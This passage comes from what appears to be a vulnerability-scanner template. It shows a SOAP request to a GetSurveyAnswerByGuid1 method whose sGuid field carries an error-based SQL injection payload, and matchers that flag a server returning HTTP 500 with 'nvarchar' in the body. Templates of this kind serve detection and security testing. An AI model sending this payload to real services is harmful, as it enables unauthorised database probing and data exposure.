          <soap:Body>
            <GetSurveyAnswerByGuid1 xmlns="http://tempuri.org/">
              <sGuid>1'and 1=@@servicename and '1'='1</sGuid>
              <sProvider></sProvider>
            </GetSurveyAnswerByGuid1>
          </soap:Body>
        </soap:Envelope>
        
    matchers:
      - type: dsl
        dsl:
          - status_code == 500
          - contains_all(body,'nvarchar')
